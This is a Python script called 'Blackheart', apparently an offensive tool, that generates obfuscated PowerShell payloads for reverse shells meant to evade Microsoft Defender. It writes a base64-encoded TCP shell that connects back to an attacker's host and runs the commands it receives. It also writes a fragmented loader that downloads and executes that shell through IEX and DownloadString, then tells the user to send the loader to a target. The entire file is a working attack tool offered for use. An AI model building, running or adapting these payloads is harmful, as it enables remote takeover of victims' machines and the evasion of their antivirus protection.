#!/usr/bin/python3

import os
import sys
import random
import base64
import argparse

try:
    from rich import print
except:
    print("Error: >rich< module not found.")
    sys.exit(1)

# Legends
infoS = f"[bold cyan][[bold red]*[bold cyan]][white]"
foundS = f"[bold cyan][[bold red]+[bold cyan]][white]"

# Banner (Just for fun)
banner = """
______ _            _    _   _                 _   
| ___ \ |          | |  | | | |               | |  
| |_/ / | __ _  ___| | _| |_| | ___  __ _ _ __| |_ 
| ___ \ |/ _` |/ __| |/ /  _  |/ _ \/ _` | '__| __|
| |_/ / | (_| | (__|   <| | | |  __/ (_| | |  | |_ 
\____/|_|\__,_|\___|_|\_\_| |_/\___|\__,_|_|   \__|     @CYB3RMX
                                                        https://github.com/CYB3RMX

    Pop reverse shells without Microsoft Defender restrictions.
"""
print(banner)

# Arguments
parser = argparse.ArgumentParser(description="Blackheart - Pop reverse shells without Microsoft Defender restrictions.")
parser.add_argument("--lhost", help="Your IP address for reverse connections.", required=True)
parser.add_argument("--lport", help="Your port for reverse connections.", required=True)
args = parser.parse_args()

# Loader template (Powershell)
template = "IEX(New-Object System.Net.WebClient).DownloadString('http://REPLACE_H:8000/rshell.ps1')"

# Removing old files
oldfls = ["shfile.ps1", "rshell.ps1"]
for ff in oldfls:
    if os.path.exists(ff):
        print(f"{infoS} Removing old [bold green]{ff}[white] file...")
        os.remove(ff)

# Base64 decoder
def Base64Encoder(target_str):
    str_bytes = target_str.encode("ascii")
    base64_bytes = base64.b64encode(str_bytes)
    base64_str = base64_bytes.decode("ascii")
    return base64_str

# Creating shell file "rshell.ps1"
print(f"{infoS} Configurating [bold green]rshell.ps1[white] file...")
shdat = open("rshell.ps1", "w")

# Defining obfuscated variable
shdat.write("$test = \'")
socket = '$remoteHost = \\"REPLACE_H\\";$remotePort = REPLACE_P;'.replace("REPLACE_H", args.lhost).replace("REPLACE_P", args.lport)
socket += 'function ConnectToServer { $socket = New-Object System.Net.Sockets.TcpClient;    try { $socket.Connect($remoteHost, $remotePort); $stream = $socket.GetStream(); $reader = New-Object System.IO.StreamReader($stream); $writer = New-Object System.IO.StreamWriter($stream); return $socket, $reader, $writer; } catch { return $null; }}while ($true) { $socket, $reader, $writer = ConnectToServer;  if ($socket -ne $null) { $socket.Client.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::KeepAlive, $true); while ($socket.Connected) { try { $writer.Write(\\"[$Env:Username]-[$Env:ComputerName]@[$PWD] >> \\");  $writer.Flush(); $command = $reader.ReadLine(); $output = Invoke-Expression $command; if ($output -is [System.Array]) { $output = $output -join [Environment]::NewLine; } $writer.WriteLine($output);  $writer.Flush(); } catch { $writer.WriteLine(\\"Error executing command: $_\\");   $writer.Flush(); } } $socket.Close(); } Start-Sleep -Seconds 3;}'
shdat.write(Base64Encoder(socket))
shdat.write("\';\n")
shdat.write("$xx = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($test));")
shdat.write("\npowershell -c $xx")
shdat.close()
print(f"{foundS} [bold green]rshell.ps1[white] configured.")

# Creating loader file "shfile.ps1"
print(f"{infoS} Creating loader file [bold green]shfile.ps1[white]...")
shtemp = template.replace('REPLACE_H', f'{args.lhost}').replace('REPLACE_P', f'{args.lport}')
print(f"{infoS} Shell length: {len(shtemp)}")
shfile = open("shfile.ps1", "w")

# Template obfuscation phase 1 (actual shell)
ph1_counter = 0
ph1_char_index = 0
ph1_temp_index = 1
for temp in range(len(shtemp)):
    if shtemp[ph1_char_index:ph1_temp_index] != "":
        shfile.write(f"$st{ph1_counter} = \"{shtemp[ph1_char_index:ph1_temp_index]}\"\n")
        ph1_counter += 1
        ph1_char_index = ph1_temp_index
        ph1_temp_index += random.randint(1, 4)
    else:
        break

# Template obfuscation phase 2 (summary)
shfile.write("$test = ")
 
# Actual shell side
for ss in range(ph1_counter):
    if ss == ph1_counter - 1:
        shfile.write(f"\"$st{ss}\"")
    else:
        shfile.write(f"\"$st{ss}\"+")

# Lets run
shfile.write("\npowershell -c $test")
shfile.close()
print(f"{foundS} Template: [bold green]shfile.ps1[white] created.")
print(f"\n{infoS}You have to send [bold green]shfile.ps1[white] to the target and execute it. Enjoy!")